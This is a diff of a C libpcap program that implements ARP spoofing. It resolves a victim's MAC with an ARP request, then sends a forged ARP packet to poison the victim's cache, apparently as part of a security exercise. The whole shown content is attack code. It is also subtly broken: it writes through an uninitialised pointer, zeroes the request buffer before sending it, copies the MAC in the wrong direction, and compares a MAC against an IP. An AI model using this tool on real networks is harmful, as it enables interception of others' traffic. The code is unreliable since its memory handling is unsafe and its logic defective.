@@ -28,14 +28,13 @@ int main(int argc, char ** argv) {
     if (argc != 4)
         usage();
     
-    char * dev = argv[1];
+    const char * dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 
-
-    ARP_pkt * arp_request = (ARP_pkt *)malloc(ARP_size);
-    memset(arp_request, 0, ARP_size);
-    u_char * arp_buf = (u_char *)malloc(ARP_size);
+    ARP_pkt arp_request;
+    memset(&arp_request, 0, ARP_size);
+    u_char * arp_buf;
     memset(arp_buf, 0, ARP_size);
 
     __uint8_t sender_ip[4];             // victim
@@ -49,24 +48,23 @@ int main(int argc, char ** argv) {
     printf("target_ip : ");
     str_ip(argv[3], target_ip);
     printf("my_mac : ");
-    get_mac(my_mac);
+    get_mac(my_mac, dev);
     printf("my_ip : ");
-    get_ip(my_ip);
+    get_ip(my_ip, dev);
     printf("\n");
     // 1 complete!
 
     ARP_req_init(arp_request, my_mac, my_ip, sender_ip);
-    memcpy(arp_buf, (const u_char *)arp_request, ARP_size);
+    memcpy(arp_buf, &arp_request, ARP_size);
     printf("[ ARP Request Packet ]");
     dump((const u_char *)arp_buf);
+    memset(arp_buf, 0, ARP_size);
     printf("\n");
     
-
-    if (-1 == pcap_sendpacket(handle, (const u_char *)arp_buf, ARP_size)){
+    if (-1 == pcap_sendpacket(handle, (const u_char *)arp_buf, ARP_size)) {
         perror("pcap_sendpacket : ");
         exit(0);
     }
-    free(arp_request);
     // 2 complete!
 
     ARP_pkt * arp_reply = (ARP_pkt *)malloc(ARP_size);
@@ -85,30 +83,40 @@ int main(int argc, char ** argv) {
         // -2 : there are no more packets to read from the savefile
         if (result == -1 || result == -2) {
             perror("pcap_next_ex : "); 
-            free(arp_reply); 
-            break; 
+            free(arp_reply);
+            break;
         }
 
-        printf("ahaha!\n");
+        memcpy(arp_reply, packet, ARP_size);
         // this packet is not ARP packet
-        if (arp_reply->type != ETHERTYPE_ARP) { continue; }
-        
+        if (ntohs(arp_reply->eh.type) != ETHERTYPE_ARP) { continue; }
+        // this is not the packet from victim
+        if (!memcmp((const u_char *)arp_reply->eh.src, (const u_char *)sender_ip, 6)) { continue; }
+
         printf("[ ARP Reply Packet ]");
         dump(packet);
-        memcpy(arp_reply, packet, ARP_size);
 
-        for(int i=0; i<6; i++) {
-            sender_mac[i] = arp_reply->s_hw_addr[i];
-            printf("%02X ", sender_mac[i]);
-        } 
+        memcpy(arp_reply->ah.s_hw_addr, sender_mac, 6);
         free(arp_reply);
+        break;
     }
     // 3 complete!
 
-    printf("ahaha!\n");
-    ARP_pkt * arp_attack = (ARP_pkt *)malloc(ARP_size);
+    ARP_pkt arp_attack;
+    memset(&arp_attack, 0, ARP_size);
+
     ARP_atk_init(arp_attack, sender_mac, my_mac, target_ip, sender_ip);
-    pcap_sendpacket(handle, (const u_char *)arp_attack, ARP_size);
+    memcpy(arp_buf, &arp_attack, ARP_size);
+    printf("[ ARP attack Packet ]");
+    dump((const u_char *)arp_buf);
+    printf("\n");
+
+    if (-1 == pcap_sendpacket(handle, (const u_char *)arp_buf, ARP_size)) {
+        perror("pcap_sendpacket : ");
+        exit(0);
+    }
+    // 4 complete!
+
     pcap_close(handle);
     return 0;
 }
